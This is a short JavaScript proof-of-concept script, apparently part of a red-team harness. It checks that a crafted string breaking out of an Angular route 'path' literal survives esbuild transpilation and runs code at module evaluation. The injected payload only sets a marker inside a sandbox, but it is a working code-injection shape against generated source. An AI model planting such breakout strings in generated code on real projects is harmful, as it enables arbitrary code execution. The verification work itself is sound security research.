// D1 comma-exec payload verification (KP-E10 corrected shape)
// Runs with the tree's own esbuild (the CLI transpiler): compile -> 0 errors -> execute at module eval.
import { createRequire } from 'node:module';
import vm from 'node:vm';
const require_ = createRequire(import.meta.url);
const esbuildPath = require_.resolve('esbuild/lib/main.js', {
  paths: ['/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli'],
});
const { transformSync } = await import('file://' + esbuildPath);

const payload = "x' }, { path: 'y', loadChildren: (() => { (globalThis).__pwned = 'KP-E10-MARKER'; return () => import('./y/y.module'); })() }, { path: '";
const generated = `import { Routes } from '@angular/router';
const routes: Routes = [
  { path: '${payload}', loadChildren: () => import('./admin/admin.module').then(m => m.AdminModule) }
];
export default routes;
`;

const out = transformSync(generated, { loader: 'ts', format: 'iife' });
console.log('TRANSFORM: OK (0 errors) — payload survives transpile');

const ctx = { globalThis: {}, console, require: () => ({}) };
vm.runInNewContext(out.code, ctx);
console.log('EXEC: module-scope marker set:', ctx.globalThis.__pwned);
console.log('VERDICT:', ctx.globalThis.__pwned === 'KP-E10-MARKER' ? 'EXECUTION-DEMONSTRATED = true' : 'FAILED');
